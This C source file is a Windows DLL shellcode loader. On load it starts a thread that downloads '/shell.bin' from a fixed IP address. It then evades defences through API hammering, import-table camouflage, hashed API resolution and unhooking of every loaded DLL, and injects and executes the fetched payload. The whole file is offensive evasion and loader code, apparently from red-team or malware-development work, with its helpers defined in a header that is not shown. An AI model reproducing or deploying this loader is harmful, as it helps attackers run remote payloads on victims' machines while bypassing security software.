#include <windows.h>
#include "common.h"

unsigned char* pPayload = NULL;
PWSTR url = L"192.168.231.133";
PWSTR endpoint = L"/shell.bin";
SIZE_T sSize = (SIZE_T) NULL;
APIS apis = { 0 };

extern __declspec(dllexport) int Apex() {
    while (TRUE) {}
}

extern __declspec(dllexport) int Attack()
{
    PVOID        pVehHandler            = NULL;
    PVOID       pInjectedPayload    = NULL;


    ApiHammering(1000);

    if (pPayload == NULL || sSize == NULL)
    {
        return -1;
    }

    IatCamouflage();

    HMODULE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH( kernel32_handle, AddVectoredExceptionHandler_CRC32);
    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(kernel32_handle, RemoveVectoredExceptionHandler_CRC32);

    ApiHammering(1000);

    if (pAddVectoredExceptionHandler == NULL || pRemoveVectoredExceptionHandler == NULL)
    {
        return -1;
    }

    pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
    if (pVehHandler == NULL)
        return -1;

    ApiHammering(1000);

    UnhookAllLoadedDlls();

    if (!pRemoveVectoredExceptionHandler(pVehHandler))
        return -1;

    ApiHammering(1000);

    if (!Inject(&pInjectedPayload))
    {
        return -1;
    }

    ApiHammering(1000);

    Execute(pInjectedPayload);

    return 0;
}

EXTERN_C DWORD fetch_payload()
{
    sSize = Download(&pPayload, url, endpoint, FALSE);
    Attack();
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH: {
            fnLoadLibraryA pLoadLibraryA;
            HANDLE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
            pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_CRC32);

            CHAR msvcrt_dll[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
            apis.handles.mscvtdll = pLoadLibraryA(msvcrt_dll);
            apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, HASH_memset);
            apis.msvcrt._time64 = (_TIME64)GetProcAddressH(apis.handles.mscvtdll, HASH__time64);
            apis.msvcrt.printf = (_PRINTF)GetProcAddressH(apis.handles.mscvtdll, HASH_printf);
            apis.msvcrt.rand = (_RAND)GetProcAddressH(apis.handles.mscvtdll, HASH_rand);
            apis.msvcrt.sprintf = (_SPRINTF)GetProcAddressH(apis.handles.mscvtdll, HASH_sprintf);
            apis.msvcrt.srand = (_SRAND)GetProcAddressH(apis.handles.mscvtdll, HASH_srand);
            apis.msvcrt.memcpy = (_MEMCPY)GetProcAddressH(apis.handles.mscvtdll, HASH_memcpy);
            apis.msvcrt.memcmp = (_MEMCMP)GetProcAddressH(apis.handles.mscvtdll, HASH_memcmp);
            apis.msvcrt.strlen = (_STRLEN) GetProcAddressH(apis.handles.mscvtdll, HASH_strlen);
            apis.msvcrt.realloc = (_REALLOC) GetProcAddressH(apis.handles.mscvtdll, HASH_realloc);
            apis.msvcrt.malloc = (_MALLOC) GetProcAddressH(apis.handles.mscvtdll, HASH_malloc);
            apis.msvcrt.wcscat = (_WCSCAT) GetProcAddressH(apis.handles.mscvtdll, HASH_wcscat);
            apis.msvcrt.wcslen = (_WCSLEN) GetProcAddressH(apis.handles.mscvtdll, HASH_wcslen);

            CreateThread(NULL, (SIZE_T) NULL, fetch_payload, NULL, (DWORD) NULL, NULL );
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}